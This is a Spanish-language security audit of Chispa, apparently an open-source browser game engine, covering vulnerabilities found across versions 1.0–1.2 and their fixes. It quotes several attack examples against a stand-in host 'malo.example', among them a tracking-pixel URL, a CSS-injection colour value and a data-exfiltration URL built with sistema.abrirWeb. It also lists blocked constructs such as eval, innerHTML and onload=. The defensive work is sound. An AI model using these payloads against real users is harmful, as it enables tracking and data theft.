# Auditoría de seguridad de Chispa

Antes de publicar Chispa como código abierto se revisó todo el motor **como
lo haría un atacante**. La pregunta era siempre la misma: *si alguien me pasa
un proyecto o un juego, ¿qué me puede hacer?*

Cada ataque que se probó tiene su test en `pruebas/seguridad.test.ts` (71
tests; 12 son de la revisión de Chispa 1.1 y los 12 últimos de la de
Chispa 1.2, al final de este documento) y en las pruebas del navegador (`pruebas-navegador/editor.mjs`, las 3
que empiezan por «seguridad»). Así ninguno puede volver a funcionar sin que
falle un test.

Gravedad: **Alta** = se podía hacer daño o espiar. **Media** = molesto o
dejaba una puerta entreabierta. **Baja** = una defensa más, por si acaso.

---

## Problemas encontrados y cómo se arreglaron

### 1. Alta · Desde un script se llegaba a las «tripas» de JavaScript

**Ataque.** En JavaScript todos los objetos esconden cosas como
`constructor`, `__proto__` o `toString`. Las tablas internas de Chispa (los
métodos de las listas y los textos, las teclas, los colores, los efectos de
sonido...) eran objetos normales, así que:

- `[1].constructor` y `"a".constructor` devolvían **una función de
  JavaScript** (`Object`) que se podía guardar en una variable y llamar;
- `"a".constructor("x")` devolvía un objeto `String` de JavaScript, algo que
  Chispa nunca debería tener;
- `yo.constructor`, `teclado.pulsada("constructor")`,
  `sonido.efecto("__proto__")`... rompían el intérprete con errores de
  JavaScript en inglés.

No se encontró un camino completo hasta `Function` (que permitiría ejecutar
JavaScript), pero es justo el primer paso de ese ataque.

**Arreglo.** `src/utilidades/seguro.ts`:

- `sinPrototipo({...})` crea tablas que **no heredan nada**. Se usa en las
  18 tablas fijas del motor.
- `propio(tabla, nombre)` solo lee lo que la tabla tiene de verdad. Se usa
  para escenas, plantillas, animaciones, casillas y los módulos.
- `tiene(tabla, nombre)` sustituye a `nombre in tabla` en el editor, que
  daba por existente una imagen llamada «constructor».

Ahora todo eso da un error de Chispa normal: «eso es una lista y no tiene
nada llamado 'constructor'».

**Comprobado también.**

- `window`, `document`, `globalThis`, `eval`, `Function`, `fetch`,
  `localStorage`... no existen en Chispa.
- Las tablas de Chispa usan `Map` (una clave `"__proto__"` es un dato más).
- El intérprete nunca convierte código en JavaScript.
- Un test revisa que en `src/` no haya `innerHTML`, `eval`, `new Function`
  ni `document.write`.

### 2. Alta · Abrir un proyecto de otra persona avisaba a su servidor

**Ataque.** Las imágenes y los sonidos de un proyecto podían ser cualquier
dirección: `"https://malo.example/pixel.png?quien=tu"`. Al abrir el
proyecto, el editor la cargaba, y ese servidor sabía **que lo habías
abierto, cuándo y desde qué dirección IP**. Pasaba igual en los juegos
exportados.

**Arreglo.** Un proyecto solo puede llevar imágenes y sonidos **dentro del
propio archivo** (`data:...;base64,...`). Se rechazan `http://`, `//`,
`file://`, `blob:` y las rutas.

### 3. Alta · Los proyectos se abrían sin comprobar nada

**Ataque.** El `.chispa.json` se usaba tal cual. Con un número donde iba un
texto, una lista donde iba un grupo, `Infinity` o millones de objetos, el
editor fallaba en sitios raros o se congelaba. Además, los campos inventados
pasaban tal cual al editor, y una clave `"__proto__"` podía cambiar la
«familia» de los objetos al copiarlos.

**Arreglo.** `src/proyecto/validar.ts` comprueba **cada campo** antes de
abrir nada, al abrir un archivo, al recuperar el autoguardado y al arrancar un
juego exportado. Construye un proyecto nuevo campo a campo:

- **Tipos:** cada campo tiene su tipo, y los números tienen que ser finitos
  y estar en su rango.
- **Nombres:** textos cortos, sin letras de control invisibles.
- **Límites:** 500 escenas, 20 000 objetos por escena, 2 000 scripts de
  hasta un millón de letras, 1 000 000 de casillas...
- **Imágenes y sonidos:** ver el punto 9.
- **Colores:** tienen que ser colores (ver el punto 4).
- **Nombres reservados:** `"__proto__"` se rechaza.
- **Campos desconocidos:** se ignoran y no llegan al editor.

Si algo no encaja, **no se abre**, con un error en español que dice dónde
está el problema:

> Este proyecto tiene algo que no está bien, y por seguridad no se abre. En
> «escenas → Principal → objetos → 1 → x»: tendría que ser un número, pero
> es un texto («mucho»).

Un test comprueba que los proyectos buenos (la Arena y el ejemplo) se abren
**sin perder nada**.

### 4. Media · Colores con trucos de CSS

**Ataque.** El color de un tipo de casilla se escribía directamente en
`style="background: ..."` del Inspector. Un «color» como
`red; background-image: url(https://malo.example/x)` cargaba algo de
internet. `esColorValido` además aceptaba `rgb(` + cualquier cosa + `)`.

**Arreglo.**

- Dentro de `rgb()` y `hsl()` solo se aceptan números, comas, `%`, `/` y
  `deg`.
- Los colores del editor se ponen con `fondoDeColor()`, que usa
  `style.backgroundColor` (solo admite colores) después de comprobarlos.
- Al abrir un proyecto, los colores que no son colores se rechazan.

### 5. Media · Un juego podía leer los récords de otro

**Ataque.** `guardar("record", ...)` guardaba en el navegador con la clave
`chispa:<nombre del proyecto>:record`. Un proyecto de otra persona que se
llamara igual que el tuyo podía leer (y borrar) tus datos.

**Arreglo.** Cada proyecto tiene un **identificador al azar**
(`crypto.randomUUID()`), y los datos se guardan con él. Como es imposible de
adivinar, los datos de un proyecto no los lee otro, aunque se llame igual.

### 6. Media · `sistema.abrirWeb` sin preguntar

**Ataque.** Un proyecto de otra persona, al ejecutarlo en el editor, podía
abrir cualquier página web. Con un truco (`"https://malo.example/?d=" +
dato`) podía enviar datos a su servidor.

**Arreglo.**

- En el editor sale una ventana con la dirección entera: «El juego quiere
  abrir una página web... ¿La abro?».
- Solo se aceptan `http://` y `https://`.
- Se abre con `noopener,noreferrer`.

En un juego exportado es el juego de su autor, y el navegador ya bloquea las
ventanas que se abren sin que el jugador pulse nada.

### 7. Alta · La protección contra bucles infinitos se podía saltar

**Ataque.** Chispa corta los bucles que dan más de un millón de vueltas sin
parar. Pero el contador se ponía a cero cada vez que empezaba un hilo nuevo.
Si **dentro** del bucle se lanzaba otro hilo, el bucle nunca llegaba al
límite y **el navegador se congelaba para siempre**. Pasaba con:

- `mientras verdadero: aLaVez(f)`;
- `mientras verdadero: destruir(crear("B"))` si «B» tiene un script.

**Arreglo.** `Interprete.conContadorPropio()`: un hilo que empieza dentro de
otro **sigue sumando en el mismo contador**. Ahora esos bucles se cortan con
el error de siempre.

### 8. Media · Congelar o llenar la memoria del navegador

**Ataques probados y lo que pasaba antes.**

| Ataque | Antes | Ahora |
|---|---|---|
| Una función que se llama a sí misma sin parar | error de JavaScript en inglés («Maximum call stack size exceeded») | «la función 'f' se ha metido demasiadas veces una dentro de otra...» (máximo 1 000) |
| `t = t + t` en un bucle | error de JavaScript («Invalid string length») | «este texto tendría 1.048.576 letras, y el máximo es un millón» |
| `t = t.reemplazar("a", "aa")` en un bucle | **se cerraba la pestaña** (sin memoria) | el mismo error, **antes** de hacerlo |
| `l = l + l` en un bucle | 23 segundos congelado y error de JavaScript | «esta lista tendría ... elementos, y el máximo es un millón» |
| Crear 900 000 objetos | 12 segundos congelado | máximo 10 000 objetos en una escena |
| 900 000 `aLaVez` | 14 segundos congelado | máximo 5 000 cosas a la vez por objeto |
| 900 000 `enviar` | 4 segundos congelado | máximo 10 000 mensajes por fotograma |
| `clonar(yo)` (o una plantilla que se crea a sí misma) en «cuando empieza» | error de JavaScript («Maximum call stack size exceeded») y el juego se rompía | «Al aparecer, «X» crea otro objeto en su «cuando empieza», y ese otro crea otro... sin parar» (máximo 40 seguidos) |

Todos los límites están en un solo sitio cada uno y dan un error en español
con una pista: «¿Hay un bucle que va juntando texto sin parar?». La pila de
llamadas de un error se corta en 12 (antes, una recursión apuntaba 1 000).

### 9. Baja · Archivos disfrazados al importar

**Ataque.** Al importar, solo se miraba la extensión y lo que decía el
navegador. Un texto llamado `foto.png` entraba como imagen. Al soltar
imágenes en la escena no se miraba ni el tamaño.

**Arreglo.** `src/proyecto/archivos.ts` mira **los primeros bytes** (la
firma de cada formato: PNG, JPG, GIF, WEBP, BMP, MP3, OGG, WAV, FLAC, WEBM,
M4A):

- lo que no es de verdad una imagen o un sonido se rechaza;
- el tipo que se guarda es el real, no el que decía el navegador;
- máximo 15 MB por archivo;
- los SVG se aceptan solo si no llevan `<script>`, `onload=`,
  `javascript:`, `<foreignObject>` ni nada de internet.

Soltar en la escena usa el mismo camino que el botón Importar. Se comprueba
también al abrir un proyecto (punto 3).

### 10. Baja · Juegos exportados sin política de seguridad (CSP)

**Arreglo.** La página del juego lleva una CSP estricta:

```
default-src 'none'; script-src 'sha256-<huella del código de Chispa>';
style-src 'sha256-...' 'sha256-...'; img-src data: blob:; media-src data: blob:;
connect-src 'none'; font-src 'none'; object-src 'none'; frame-src 'none';
worker-src 'none'; manifest-src 'none'; base-uri 'none'; form-action 'none'
```

- Solo se ejecuta el código de Chispa que va dentro, por su huella SHA-256
  (`src/utilidades/sha256.ts`, comprobada contra la de Node). Un
  `<script>` colado en la página **no se ejecuta**, y un
  `<img src="https://...">` colado **no carga**: hay una prueba en Chromium
  de verdad.
- La página no puede conectarse a nada. Para eso, los sonidos se leen del
  propio archivo sin `fetch`.
- Los botones táctiles ya no usan `innerHTML`: sus estilos van en la
  página, con su huella.
- Además, `<meta name="referrer" content="no-referrer">`.

Lo que ya estaba bien: el JSON del proyecto dentro de la página cambia `<`
por `<` (nadie puede cerrar el `<script>`), y el título se escapa.

### 11. Baja · El editor sin política de seguridad

**Arreglo.** El editor compilado (`npm run build`) lleva su CSP (en
`vite.config.ts`):

- solo ejecuta sus propios archivos;
- imágenes, sonidos y conexiones solo del propio editor o de dentro del
  proyecto.

Aunque algo se colara, no podría cargar nada de internet. Los estilos en
línea se permiten porque CodeMirror los necesita; un estilo no ejecuta
código y, con esta CSP, tampoco puede cargar nada de fuera.

### 12. Baja · Datos guardados rotos

**Ataque.** Lo que un juego guarda está en el navegador, y cualquiera lo
puede cambiar a mano. Un dato roto hacía fallar `cargar()` con un error de
JavaScript.

**Arreglo.** `deserializar()` comprueba cada parte. Lo que no encaja vale
`nulo` y nunca rompe el juego. Hay un límite de profundidad.

### 13. Baja · `public/reproductor.js` estaba en Git

Es un archivo que se genera solo (`npm run reproductor`) y estaba en el
`.gitignore`, pero se había guardado antes. Se ha quitado de Git: no tenía
nada secreto, pero así no se sube código compilado al repositorio.

---

## Chispa 1.1: revisión de todo lo nuevo

Al terminar la 1.1 se repitió la auditoría sobre lo que se había añadido:
juntas, efectos y partículas, luces, estilo de los objetos, estampas,
sonido por sitios, música por capas, sonidos y canciones hechos en el
editor, controles de interfaz, puntuaciones, varios jugadores y cámaras,
letras propias, icono y pantalla de carga, plantillas y recursos listos.
Se probaron unos 35 ataques (scripts que piden cosas sin fin o con números
disparatados, y archivos de proyecto con valores fuera de sitio). Estos
son los que funcionaban:

### 14. Media · Sonidos sin fin

`sonido.reproducir` o `sonido.bucleEn` dentro de un bucle creaban una voz
por cada llamada, sin tope: con unas decenas de miles el juego se quedaba
parado (más de un minuto) y la memoria crecía. Además, el historial de
órdenes de sonido crecía durante toda la partida.

**Arreglo:** como mucho 64 sonidos a la vez (`MAXIMO_VOCES`); los que se
piden de más no suenan. El mismo bucle pedido otra vez en el mismo sitio
sustituye al anterior. El historial guarda solo las últimas órdenes.

### 15. Media · Canciones y sonidos hechos que llenan la memoria

Las canciones y los sonidos hechos en el editor van en el proyecto como
números y notas, y al empezar el juego se convierten en sonido. Cada uno
estaba dentro de sus topes, pero no había tope para la suma: un archivo
con 200 canciones del tamaño máximo pedía unos 19 GB al empezar, y 2000
sonidos largos, 1,4 GB.

**Arreglo:** se preparan como mucho 1200 segundos de música (contando
cada pista) y 600 de sonidos hechos (`audioQueCabe`, en
`JuegoEnMarcha.ts`). Lo que no cabe se queda en silencio y se avisa en la
consola. El proyecto se abre igual: nadie pierde su trabajo por esto.

### 16. Media · Estampas sin tope de memoria

Las estampas (los dibujos ya hechos que aceleran el dibujo, nuevas en la
1.1) tenían tope de cantidad (400) y de tamaño (768 píxeles), pero juntas
podían ocupar casi 1 GB, y un objeto podía seguir guardando una estampa
ya tirada.

**Arreglo:** entre todas no pasan de 16 millones de píxeles (unos 64 MB).
Al tirar una se vacía su lienzo (suelta la memoria al momento) y quien la
tuviera lo nota y la pide otra vez. Las recién hechas no se tiran: si no
caben todas, las que sobran se pintan directamente, como antes de las
estampas.

### 17. Baja · Números de aspecto sin tope en marcha

`yo.tamanoResplandor`, `yo.desenfoqueSombra`, `yo.borde`,
`yo.grosorContorno`, `yo.desenfoque`, `yo.sombraX`, `yo.sombraY` y
`yo.brillo` tenían tope al abrir un archivo, pero no al cambiarlos desde
un script: un resplandor de un trillón de píxeles deja el navegador
pintando sin parar.

**Arreglo:** los mismos topes que en el archivo (se recorta sin dar error).

### 18. Baja · Un nombre enorme en las puntuaciones

`puntuaciones.guardar` con un nombre de cientos de miles de letras, miles
de veces, paraba el juego 15 segundos (se limpiaba el nombre entero antes
de recortarlo a 16 letras).

**Arreglo:** solo se mira el principio del nombre.

### 19. Baja · Otros topes que faltaban

- `escena.camara.encuadrar` con una lista de 100 000 objetos: ahora, 100
  como mucho, con un error claro.
- `efecto.texto` con un texto de medio millón de letras: se recorta a 200.
- En el editor, al cambiar el nombre de un objeto se cambia también en el
  código. Un nombre con comillas, llaves o barras ya no se escribe en los
  scripts (los rompería).

### Probado en lo nuevo y sin problemas

Juntas (tope de 500), partículas (3000), polígonos y caminos (500 y 400
puntos), lados (64), opciones de una lista (200), casillas del inventario,
letras propias (el nombre no puede llevar nada de CSS), icono (solo vale
el nombre de una imagen del proyecto), filtros de pantalla y luces (cada
número tiene su intervalo), `constructor` y `__proto__` en todos los
módulos nuevos, nombres con trampa en `efecto.usar`, `yo.patron`,
`yo.mezcla`, `yo.forma` y en los controles de cada jugador, y la pantalla
de carga (el nombre del juego y el icono van escapados en la página).
`npm audit` sigue dando 0 vulnerabilidades y no se ha añadido ninguna
dependencia.

## Chispa 1.2: revisión de lo nuevo (móvil y tablet)

Lo que se añadió en la 1.2 y se revisó: los controles de pantalla (`tactil`),
la calidad y el límite de fotogramas, el juego como app instalable (ficha y
service worker), el editor como app instalable, «Mis proyectos» (guardados en
el navegador), compartir, la reducción de fotos al importar, el campo
invisible del teclado de pantalla, y los menús y la ayuda que salen al dejar
el dedo. Lo más delicado es el service worker, porque es código que se queda
instalado en el aparato.

### 20. Baja · El campo invisible del teclado no tenía tope

Para que salga el teclado del móvil, el motor enfoca un campo de texto de
verdad, invisible. No tenía longitud máxima: pegando un texto enorme, cada
letra pasaba al juego una a una.

**Arreglo:** 2000 letras como mucho (`MAXIMO_TECLADO`); lo que pase se
recorta antes de llegar al juego.

### 21. Baja · Un botón llamado «constructor»

El sitio donde quien juega deja cada control se guardaba en un objeto
normal de JavaScript, y se buscaba por el nombre del botón. Un botón
llamado `constructor` o `__proto__` encontraba cosas del propio JavaScript
en vez de «nada»: no se podía hacer daño, pero el botón salía mal colocado.

**Arreglo:** ese objeto ya no tiene «padre» (`Object.create(null)`), ni
al crearlo ni al leerlo de lo guardado.

### 22. Baja · «Mis proyectos» se fiaba de lo guardado

La lista enseñaba el nombre tal como estaba guardado en el navegador. Si
eso se rompe (o lo cambia otro programa), podía llegar algo que no fuera un
texto o un nombre larguísimo.

**Arreglo:** el nombre se limpia al leerlo (`nombreSeguro`: siempre texto,
80 letras) y un identificador de más de 80 letras no se guarda. Al abrir un
proyecto de la lista pasa por la misma validación que un archivo de fuera.

### 23. Baja · La versión dentro del service worker

El número de versión se escribe en un comentario al principio de `sw.js`.
Hoy siempre es una huella (letras y números), pero si algún día llegara
otra cosa podría cerrar el comentario y colar código.

**Arreglo:** en el comentario solo se dejan letras, números, puntos y
guiones; en el código va con `JSON.stringify`. El prefijo de la caja solo
admite letras minúsculas y guiones.

### El service worker, punto por punto

- **Solo sirve una lista fija**: los cinco archivos del juego (o los del
  editor), hecha al exportar. Una petición a otra carpeta del mismo sitio,
  a otro sitio, con `..`, por `http` o que no sea `GET` ni la mira: la hace
  el navegador como siempre. Hay un test que lo ejecuta con un navegador de
  mentira y le pide todo eso.
- **No recibe órdenes**: no escucha mensajes de la página (`message`), ni
  avisos (`push`), ni sincronizaciones. No carga más código
  (`importScripts`), no usa `eval` y no guarda nada después de instalarse.
- **Su alcance es su carpeta**: se apunta con una ruta relativa (`./sw.js`),
  así que el navegador no le deja tocar nada de fuera de la carpeta del juego.
- **Cada juego tiene su caja**, con su dirección en el nombre. Al
  actualizarse solo borra sus versiones viejas: ni las de otro juego del
  mismo sitio ni las de otros programas.
- **No cambia lo que puede hacer la página**: lo que sirve es la misma
  página, con su misma política de seguridad dentro.

### La política de seguridad de la app

El juego como app necesita tres permisos más que «una página», y los tres
son solo para su propia carpeta: `manifest-src 'self'` (la ficha),
`worker-src 'self'` (el service worker) e `img-src 'self'` (los iconos).
Todo lo demás sigue igual: `default-src 'none'`, el código y los estilos
solo por su huella (`'self'` NO vale para scripts), `connect-src 'none'`
(la página no puede conectarse a ningún sitio, ni al suyo). La prueba del
navegador comprueba que un `fetch` desde el juego falla.

El editor como app no cambia su política: ya tenía `worker-src 'self'`.

### Probado en lo nuevo y sin problemas

- `constructor` y `__proto__` en `tactil` y en lo nuevo de `pantalla`;
  nombres con trampa en `tactil.boton`, `tactil.mover`, `tactil.quitar`,
  `tactil.mostrar`, `pantalla.calidad` y `pantalla.orientacion`.
- El nombre de un botón se pone como texto: `<img src=x>` sale escrito tal
  cual. Como mucho 12 botones de 12 letras; un bucle que pide 500 se para
  con un error claro.
- Lo guardado sobre el sitio de los controles se lee con cuidado: si no es
  lo que se espera se tira; solo valen números de 0 a 1, nombres de 40
  letras y las primeras 13 entradas.
- `orientacion`, `calidad` y `maximoFps` en el archivo de un proyecto solo
  admiten sus valores; cualquier otra cosa y el proyecto no se abre.
- El nombre del juego en la ficha de la app va por `JSON.stringify`, y en
  la página, escapado. La ficha solo lleva campos fijos y rutas de su carpeta.
- Las fotos enormes: se reducen a 1024 px de lado, sean cuales sean sus medidas.
- `tactil.vibrar`: 5 segundos como mucho, y el navegador solo vibra después
  de un toque de quien juega.
- Compartir usa el menú del propio aparato, con el mismo nombre de archivo
  limpio que al descargar. Los menús y la ayuda al dejar el dedo se
  construyen con nodos de texto.
- `npm audit` sigue dando 0 vulnerabilidades y no se ha añadido ninguna
  dependencia.

---

## Revisado y sin problemas

- **HTML con datos del usuario (XSS).** Toda la interfaz se construye con
  `h()` y nodos de texto. Nombres de objetos, textos, diálogos, errores y
  notificaciones se ponen como texto, nunca como HTML. Los errores del motor
  usan `textContent`. Los diálogos del juego y los textos se dibujan en el
  canvas. Hay una prueba en Chromium que abre un proyecto con
  `<img onerror>` y `<script>` en todos los nombres y textos, lo juega y
  comprueba que no aparece ninguna etiqueta nueva ni se ejecuta nada.
- **Órdenes de la consola.** Son código de Chispa, con las mismas reglas.
- **Textos con huecos** (`"Puntos: {juego.puntos}"`). Son código de Chispa
  dentro del intérprete.
- **Dependencias.** `npm audit`: **0 vulnerabilidades**. Las 13 dependencias
  se usan todas (8 de CodeMirror y 5 para desarrollar y probar), y ninguna
  va dentro de los juegos exportados salvo el propio Chispa.
- **Historial de Git** (40 commits). No hay contraseñas, claves, tokens,
  correos personales ni rutas de tu ordenador. Detalles en el informe.

## Riesgos aceptados (y por qué)

- **Hasta un millón de vueltas por bucle.** Un bucle pesado pero finito
  puede parar el juego uno o dos segundos. Bajar el límite rompería juegos
  normales.
- **`guardar()` en un bucle** puede escribir muchas claves. El navegador ya
  pone un tope (unos 5 MB por página).
- **El editor permite estilos en línea** en su CSP, por CodeMirror.
- **`npm run dev` no lleva CSP.** Vite necesita más libertad para recargar
  al momento. La CSP va en lo compilado, que es lo que se publica.
- **En GitHub Pages, todas las webs de la organización comparten
  «origen»** (`chispa-motor.github.io`). Para el navegador son la misma web,
  así que otra página publicada en Pages desde la organización `chispa-motor`
  (otro repositorio suyo) podría leer lo que Chispa guarda en el navegador:
  el proyecto autoguardado y los récords de los juegos. No es un problema
  mientras todo lo que se publique ahí sea de confianza. Si algún día la
  organización publica en Pages algo que no controla, conviene poner Chispa en
  su propio dominio (Settings → Pages → Custom domain).
- Una CSP puesta con `<meta>` no puede decir `frame-ancestors`. Si alguien
  quiere impedir que su juego se meta dentro de otra web, lo tiene que
  configurar en su servidor. Para itch.io justamente tiene que poder ir
  dentro.
- **(1.2) Un juego instalado como app se actualiza a la segunda.** Primero
  sirve lo guardado (por eso va sin internet); la versión nueva se guarda por
  detrás y sale la siguiente vez que se abre. Si se publica un arreglo
  urgente, quien ya tenía el juego lo ve al abrirlo dos veces.
- **(1.2) El service worker de un juego manda solo en su carpeta, pero el
  sitio donde se sube manda sobre él.** Quien controle el sitio web (o una
  carpeta de más arriba) puede poner su propio service worker por encima. Es
  así en cualquier web: hay que subir los juegos a un sitio de confianza.
- **(1.2) Un juego puede vibrar muchas veces seguidas** (5 segundos cada
  vez). El navegador solo lo permite después de un toque y se para al cerrar
  o esconder la página. En iPhone no vibra nunca.
- **(1.2) «Mis proyectos» vive en el navegador.** Vale lo dicho arriba sobre
  compartir origen, y el navegador puede borrarlo si se queda sin sitio (se
  le pide que no lo haga, pero puede negarse).
